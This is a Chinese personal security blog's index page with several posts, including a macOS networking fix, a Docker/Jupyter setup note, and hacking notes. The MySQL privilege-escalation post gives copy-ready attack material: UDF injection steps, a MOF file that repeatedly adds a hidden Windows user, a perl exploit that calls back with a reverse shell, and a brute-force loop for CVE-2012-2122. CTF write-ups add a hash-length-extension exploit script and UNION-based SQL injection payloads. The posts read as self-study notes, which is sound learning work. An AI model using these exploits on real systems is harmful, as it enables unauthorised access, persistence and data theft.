<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content><meta name="keywords" content><meta name="author" content="Arnoux"><meta name="copyright" content="Arnoux"><title>樱花边缘</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?05dffefe4c841128965d826f624af472";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '3.8.0'
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Arnoux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">16</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">4</span></a></div></div></div><nav id="nav" style="background-image: url(https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/background.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">樱花边缘</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="https://github.com/gwjczwy">Github</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">樱花边缘</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/04/解决MACOS网络配置页面卡死/">解决MACOS网络配置页面卡死</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-04</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><p>针对同这个人遇到的问题：<a href="https://discussionschinese.apple.com/thread/250320211" target="_blank" rel="noopener">https://discussionschinese.apple.com/thread/250320211</a><br>鼠标点到配置页面里的文本编辑框就会卡死，无法输入也无法点击。之前的”土办法”是先把IP地址等信息打到VScode里再粘贴过来。粘贴的过程中需要不断按下粘贴的快捷键并反复切换应用窗口。这样才有概率粘贴进去，今天发现有命令能配置。<br><strong>使用命令</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo networksetup -setmanual &amp;quot;USB 10/100/1000 LAN&amp;quot; 192.168.1.4 255.255.255.0 192.168.1.1</span><br><span class="line">**对应位置**</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo networksetup -setmanual &amp;quot;USB 10/100/1000 LAN&amp;quot; IP地址 子网掩码 网关/路由器</span><br></pre></td></tr></table></figure>
<p>直接命令行配置，就不存在鼠标点击导致卡死的问题了。</p>
<hr>
<p>命令到这里就结束了，下面是个人的一点小牢骚。<br>为了解决问题，今天重做了系统。刚重做好还是正常可以点击输入的，等到时间机器导入回个人数据之后就又触发BUG了。估计是配置文件里有两个事件冲突了，或者调用了之后一直不返回。只能等到切换窗口这类事件打断才能返回。<br>每次出差到客户那边，看着我配网址的时候。几个人看着我拿出MAC电脑，有时候还会有夸赞MAC有多好的。然后看着我连地址都配不上，我都急的满头大汗。。。<br>用电脑从来没有这么折腾过，Windows真香！</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/07/30/mysql提权总结/">mysql提权总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-30</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/mysql提权/">mysql提权</a></span><div class="content"><h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>事出有因，发现mysql的提权还不是很熟。需要研究一下。<br>另外，如果真的想成为一名大师，对于一个东西一定要熟。你把它研究透了，从内到外都滚瓜烂熟了，才有可能在遇到需要它的时候成功利用。<br>你永远不知道下一秒会发生什么。很有可能下一秒机会就出现。而那些真正厉害的黑客一定是早早就把可能用到的东西研究透了，已经烂熟于心。这样才能在那些稍纵即逝的机会面前抓住他。<br>不只是第一步，思路一定要清晰。在踏出第一步之前就已经对于每一步可能发生的情况都非常清楚，知道要向什么方向走。</p>
<h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><h4 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h4><p>因为默认是没有这个文件夹的：C:/Users/username/Documents/phpstudy/MySQL/lib/plugin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Users\\username\\Documents\\phpstudyMySQL\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Users\\username\\Documents\\phpstudyMySQL\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
<h4 id="udf注入-Linux"><a href="#udf注入-Linux" class="headerlink" title="udf注入(Linux)"></a>udf注入(Linux)</h4><p><a href="../../../../img/mysql提权/linux_udf_64.txt">linux_udf_64.so</a>这个不知道函数名是啥，从下面的常用命令看应该是叫<code>sys_eval</code>。</p>
<p><a href="../../../../img/mysql提权/mysql-udf命令.txt">linux_udf常用命令</a></p>
<h4 id="udf马"><a href="#udf马" class="headerlink" title="udf马"></a>udf马</h4><p><a href="../../../../img/mysql提权/udf.php">udf.php</a></p>
<h4 id="udf反弹shell"><a href="#udf反弹shell" class="headerlink" title="udf反弹shell"></a>udf反弹shell</h4><p><a href="../../../../img/mysql提权/mysqlShellExp.txt">mysqlShellExp.txt</a>这个udf.dll文件有点大，可能有后门。。。</p>
<p>运行创建函数的时候会提示没有这个函数，但实际上是成功的。</p>
<p><img src="../../../../img/mysql提权/image-20200728135149596.png" alt="image-20200728135149596"></p>
<p><img src="../../../../img/mysql提权/image-20200728144754247.png" alt="image-20200728144754247"></p>
<h4 id="mysql自动化上传"><a href="#mysql自动化上传" class="headerlink" title="mysql自动化上传"></a>mysql自动化上传</h4><p>python sqlmap.py -u ‘xxxx’ –file-write=/lib_mysqludf_sys.so  –file-dest=/usr/lib/mysql/plugin/</p>
<h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>要winServer2003以下才能用。。</p>
<p><a href="https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/23083.zip" target="_blank" rel="noopener">国外大神0day工具</a></p>
<p><strong>用法：</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">perl mysql_win_remote.pl <span class="number">10</span>.<span class="number">211</span>.<span class="number">55</span>.<span class="number">3</span> root root <span class="number">10</span>.<span class="number">211</span>.<span class="number">55</span>.<span class="number">4</span> <span class="number">9999</span></span><br><span class="line">mysql服务器地址 账号 密码 反弹shell地址 端口</span><br></pre></td></tr></table></figure>
<p>perl需要安装 DBD::mysql DBD 模块。mac10.15.5 安装失败。。</p>
<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>win7的用msf模块打了，不成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line"><span class="built_in">set</span> username</span><br><span class="line"><span class="built_in">set</span> rhost</span><br><span class="line"><span class="built_in">set</span> rport</span><br><span class="line"><span class="built_in">set</span> lhost</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>据说windows2003可以。</p>
<h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>nullevt.mof文件源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test$ cKediTor /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>用法：</strong></p>
<p>系统每五秒创建一个账户<code>test$</code>，里面命令可以自定义<br>使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;C:/phpstudy/WWW/nullevt.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
<p>利用的是windows系统的一个机制，以管理员权限每5分钟执行一次。</p>
<p>万一成功了想要删掉需要：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> stop winmgmt</span><br><span class="line"><span class="built_in">net</span> user ghtwf011 /delete</span><br><span class="line">切换到 c:/windows/system32/wbem 目录</span><br><span class="line"><span class="built_in">del</span> repository</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> winmgmt</span><br></pre></td></tr></table></figure>
<h3 id="hackmysql综合利用工具"><a href="#hackmysql综合利用工具" class="headerlink" title="hackmysql综合利用工具"></a>hackmysql综合利用工具</h3><p><a href="https://github.com/T3st0r-Git/HackMySQL" target="_blank" rel="noopener">https://github.com/T3st0r-Git/HackMySQL</a></p>
<p>集成了<strong>全自动udf一键执行命令</strong>(里面有几个自带的dll，不知道有没有后门)</p>
<p><img src="../../../../img/mysql提权/image-20200728111918702.png" alt="image-20200728111918702"></p>
<p><strong>写启动项</strong></p>
<p><strong>LPK.dll劫持系统目录提权</strong></p>
<p>这个试了也提示成功但实际上是没有这个账户的。。</p>
<p><img src="../../../../img/mysql提权/image-20200728111712200.png" alt="image-20200728111712200"></p>
<p><img src="../../../../img/mysql提权/image-20200728111730064.png" alt="image-20200728111730064"></p>
<h3 id="允许远程连接"><a href="#允许远程连接" class="headerlink" title="允许远程连接"></a>允许远程连接</h3><p>更改 “mysql” 数据库里的 user 表里的 host 项，将 localhost 改为 %</p>
<h3 id="CVE-2012-2122-Mysql身份认证漏洞"><a href="#CVE-2012-2122-Mysql身份认证漏洞" class="headerlink" title="CVE-2012-2122 Mysql身份认证漏洞"></a>CVE-2012-2122 Mysql身份认证漏洞</h3><p>不断尝试登陆，平均256次就能成功一次。无需密码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        subprocess.Popen(<span class="string">"mysql -u root -p -h 192.168.0.16 --password=test"</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 1000`; <span class="keyword">do</span> mysql -u root -p -h 192.168.0.16 --password=bad 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<!--恍惚间想起自己还有一个博客，还有等着我实现的梦想。感觉总算是入了圈，后面的路还有很长。
回头看看已经一年了，看着自己一年多以前写下的内容惊呼：“我竟然会用这种口吻说话？这根本不是我！”才惊觉时光流逝以为不变的我竟发生了如此大的变化。原来不管怎样我一直都在变。既然如此也没有必要死守着那个年少的自己了。归来者才是少年，因此仍是少年。--></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/08/09/De1ctf2019 梳理/">De1ctf2019 梳理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-08-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/writeup/">writeup</a></span><div class="content"><h1 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h1><h2 id="tcl"><a href="#tcl" class="headerlink" title="tcl"></a>tcl</h2><p>刚拿到这题就直接分析源码,代码看是看懂了.但完全没有思路,那个action不是写死了吗?secret token我不知道啊?哎,吃了没听说哈希扩展攻击的亏..</p>
<p>之后看到了writeup,就来梳理一下.</p>
<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup:"></a>writeup:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import requests,hashpumpy,urllib    </span><br><span class="line">payload = &apos;flag.txt&apos;</span><br><span class="line">param = &apos;param=&apos; + payload</span><br><span class="line">base_url = &apos;http://139.180.128.86/&apos;</span><br><span class="line">signurl = base_url + &apos;geneSign?&apos; + param</span><br><span class="line">r = requests.post(url=signurl,cookies=&#123;&apos;action&apos;:&apos;scan&apos;&#125;)</span><br><span class="line">sign = r.content</span><br><span class="line">print sign</span><br><span class="line">readsign,add_data = hashpumpy.hashpump(sign,payload+&apos;scan&apos;,&apos;read&apos;,16)</span><br><span class="line">print readsign</span><br><span class="line"># print add_data</span><br><span class="line">add_data = add_data[len(payload):]</span><br><span class="line">print add_data</span><br><span class="line">expurl = base_url + &apos;De1ta?&apos; + param</span><br><span class="line">r = requests.post(url=expurl,cookies=&#123;&apos;action&apos;:urllib.quote(add_data),&apos;sign&apos;:readsign&#125;)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>
<p>网站有两个功能,<code>scan</code>和<code>read</code>.<code>scan</code>负责读取数据并写入到本地,<code>read</code>负责读取本地保存的数据.每次执行操作前需比对<code>sign</code>,如果不对则返回500错误.</p>
<p>然后我们这边就要先读取<code>flag.txt</code>.</p>
<p>具体执行读取文件是在源代码中的86行,使用<code>urlopen</code>打开传递的<code>param</code>参数的文件.这个地方还有个<code>waf</code>函数,所以<code>param</code>参数不能以<code>file</code>和<code>gopher</code>开头.但其实直接写<code>flag.txt</code>就完事了.</p>
<p>在读取前,需要先获取<code>sign</code>.于是构造:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://139.180.128.96/geneSign?param=flag.txt</span><br></pre></td></tr></table></figure></p>
<p>并在访问时构造<code>cookie={&#39;action&#39;:&#39;scan&#39;}</code></p>
<p>访问得到<code>sign</code>为<code>8370bdba94bd5aaf7427b84b3f52d7cb</code>.也就是<code>secret_key+flag.txt+scan</code>的哈希值.</p>
<p>之后我们就要执行读取操作,但并不知道<code>secret_key</code>的值无法重新计算哈希值.于是就要用到哈希长度扩展攻击了.</p>
<h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件:"></a>使用条件:</h3><ol>
<li><p>已知明文长度</p>
</li>
<li><p>已知哈希值</p>
</li>
<li><p>已知明文结尾处字符</p>
</li>
</ol>
<h3 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DESKTOP-Q7DV3IJ:~<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 8370bdba94bd5aaf7427b84b3f52d7cb</span><br><span class="line">Input Data: flag.txtscan</span><br><span class="line">Input Key Length: 16</span><br><span class="line">Input Data to Add: <span class="built_in">read</span></span><br><span class="line">d7163f39ab78a698b3514fd465e4018a</span><br><span class="line">flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
<p>这里攻击后直接生成了<code>secret_key+flag.txt+&quot;scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read&quot;</code>的哈希值:<code>d7163f39ab78a698b3514fd465e4018a</code></p>
<p>然后我们构造url:<code>http://139.180.128.86/De1ta?param=flag.txt</code>cookies={‘action’:’scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read’,’sign’:’d7163f39ab78a698b3514fd465e4018a’</p>
<p>这样,就可以使用伪造的签名愉快的去获取flag啦~</p>
<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>其他的题目…目前还没有能做出来的.做完了再更新吧.把一道题目的解法写出来就像是给别人讲解一样,在讲解的同时也是在梳理知识点,加深自己的印象,是一个很好的习惯.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/08/02/upload-labs第20关详解/">upload-labs第20关详解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-08-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><p>拿到题目,首先分析源码.</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/013x01.jpg" alt="题目"></p>
<p>获取了一个post参数save_name作为文件名称.进行操作,这里有一个逻辑漏洞.后台先是对file进行判断,如果不是数组才会对他进行分割.</p>
<p>那么如果我们直接传入一个数组会怎么样呢?</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/013x02.jpg" alt="尝试上传"></p>
<p>成功上传</p>
<h2 id="但是"><a href="#但是" class="headerlink" title="但是"></a>但是</h2><p>为什么这样就能成功上传?我又读了一遍代码,代码逻辑应该是没问题的啊?也就是说,即使我们用post方式传递的是数组也应该能正确执行才对啊.</p>
<h2 id="调试代码"><a href="#调试代码" class="headerlink" title="调试代码"></a>调试代码</h2><p>在头部添加开启报错信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">error_reporting(-1);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, 1);</span><br></pre></td></tr></table></figure>
<p>添加调试信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;长度: '</span>.count(<span class="variable">$file</span>).<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;数组: '</span>.print_r(<span class="variable">$file</span>).<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;count -1'</span>.<span class="variable">$file</span>[count(<span class="variable">$file</span>) - 1].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;count -2'</span>.<span class="variable">$file</span>[count(<span class="variable">$file</span>) - 2].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;count -3'</span>.<span class="variable">$file</span>[count(<span class="variable">$file</span>) - 3].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;0  :'</span>.<span class="variable">$file</span>[0].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;1  :'</span>.<span class="variable">$file</span>[1].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;2  :'</span>.<span class="variable">$file</span>[2].<span class="string">'&lt;/p&gt;'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/013x03.jpg" alt="添加调试信息"></p>
<p>再次上传,看一下输出</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/013x04.jpg" alt="输出内容"></p>
<p>注意一下这个地方,数组长度为<code>2</code>,数组内容为<code>Array ( [0] =&gt; upload-20.jpg [2] =&gt; jpg )</code>.</p>
<p>问题好像出来了.从这一行可以看出这个数组好像不是一个索引数组,而是一个关联数组.而且是以数字类型为关联键.</p>
<p>这也正是为什么调用<code>$file[count($file)-1]</code>的时候会返回空.因为<code>count($file)</code>的值为2,整个语句就是<code>$file[1]</code>.而file数组作为一个关联数组只有0和2两个键,没有名为1的建,所以只能返回空.后面作为后缀名拼接的时候就只有前面的$file[0]作为文件名.</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/013x05.jpg" alt="好可爱~"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/12/sql注入笔记/">sql注入笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h1><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;id=4630" target="_blank" rel="noopener">题目链接</a></p>
<p>首先拿到题目,首先试下sql注入.居然是sql注入的题目..</p>
<h3 id="确定注入"><a href="#确定注入" class="headerlink" title="确定注入"></a>确定注入</h3><p><code>hello&#39; or &#39;1&#39;=&#39;1&#39;#</code></p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/012x01.png" alt="确定注入点"></p>
<h3 id="确定回显位"><a href="#确定回显位" class="headerlink" title="确定回显位"></a>确定回显位</h3><p><code>hello&#39; union select 1,2,3 #</code></p>
<h3 id="获取全部数据库名"><a href="#获取全部数据库名" class="headerlink" title="获取全部数据库名"></a>获取全部数据库名</h3><p><code>hello&#39; union select 1,2,schema_name from information_schema.schemata #</code></p>
<h3 id="获取全部表名"><a href="#获取全部表名" class="headerlink" title="获取全部表名"></a>获取全部表名</h3><p><code>hello&#39; union select 1,2,table_name from information_schema.tables #</code></p>
<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><p><code>hello&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;secret_table&#39; #</code></p>
<h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p><code>hello&#39; union select 1,2,fl4g from secret_table #</code></p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/012x02.png" alt="获取字段值"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/12/攻防世界的一些ctf/">攻防世界的一些ctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="题目描述：抓住那只猫"><a href="#题目描述：抓住那只猫" class="headerlink" title="题目描述：抓住那只猫"></a>题目描述：抓住那只猫</h1><p>一个网站测试的网页</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/011x01.jpg" alt="攻防世界的一些ctf_0x01"></p>
<p>随便试了一个<code>index.php?url=%89</code>之后提示了Django的报错,推测是使用后端的php调用了Django网站的接口</p>
<p>同时题目提示去看Curl的用法.发现curl除了传输文本还可以用@+文件路径把文件传过去.</p>
<p>在刚才的报错信息中搜索<strong>database</strong>可以看到数据库位置</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/011x02.jpg" alt="攻防世界的一些ctf_0x02"></p>
<p>把数据库当参数传过去 <code>index.php?url=@/opt/api/database.sqlite3</code></p>
<p>报错信息里就有flag了</p>
<p>涨知识了,curl还能这么用(说的好像你用过一样)</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/06/23/使用docker在vps上安装jupyter/">在vps上部署python开发环境</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>前段时间发现有个网站的漫画资源挺多,但想看需要翻墙.于是就寻思着写个爬虫爬到本地看.但vps上的python只能在命令行上敲.于是就想起了jupyter notebook.</p>
<h1 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h1><p>系统是Centos的,装了jupyter之后提示还是找不到命令…</p>
<p>Google了一番之后无果,那还是用docker起吧.</p>
<p>个人还是很喜欢docker的,因为docker可以说是终极解决方案了.docker的使用体验非常友好,因为docker绝不出错.</p>
<p>像我这种bug体质😱的人来说可以说是首选方案了.能docker就docker,实在简单或者有把握自己调试才会直接用.</p>
<p>在dockerhub上找了个比较全的<code>jupyter/all-spark-notebook</code>.据介绍说把所有的环境几乎都配了.有<code>Python, Scala, R, Spark, Mesos Stack</code>,我试了下python,发现常用的reqeusts库,bs库都是有的.还不错.没有的我后面再说怎么装.</p>
<h1 id="开冲"><a href="#开冲" class="headerlink" title="开冲!!!"></a>开冲!!!</h1><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --rm -p 8888:8888 -v /root/downloads:/downloads jupyter/all-spark-notebook</span><br></pre></td></tr></table></figure>
<p>注意,上面的命令带有<code>--rm</code>参数,也就是说在停止容器后再次运行之前的所有更改就没有了,包括所有代码.只有<code>/downlads</code>目录下的文件会和宿主机的<code>/root/downloads</code>目录保持同步.</p>
<p>因为不加<code>--rm</code>参数的话停下容器下次再启动的命令是有变化的.好像是把<code>run</code>替换成<code>start</code>还是<code>continue</code>,总之是一个继续的命令.不然会报错.</p>
<h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it condescending_dirac /bin/bash</span><br></pre></td></tr></table></figure>
<p>进去之后发现有个问题,这个镜像中运行jupyter服务是以<code>jovyan</code>用户启动的,id为1000.而<code>/downloads</code>目录是拒绝<code>jovyan</code>访问的…</p>
<p>这就很尴尬了,我被我起的虚拟机拒绝了??这好像不太合适吧?(就好像你玩单机到商店买东西,结果老板说你钱不够……特喵的,整个游戏都是老子的,你算老几???8说了,<code>cheatengine-x86_64.exe</code>启动.把价格改成0!!!啊不,改成负的……XXX.exe 已停止响应 -&gt;等待 终止程序)</p>
<p>那咱就<code>sudo su - root</code>切一下用户呗…</p>
<p>root密码咱也不知道啊!</p>
<p>后来发现有个命令参数<code>-u 0</code>,这样进去虚拟机的时候就是以root身份登进去的.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -u 0 -it awesome_yalow /bin/bash</span><br></pre></td></tr></table></figure>
<p>修改目录访问权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod -R 777 /downloads</span><br></pre></td></tr></table></figure>
<p>ok,解决了.</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>接下来就是使用了,熟悉jupyter的人就不用看了.</p>
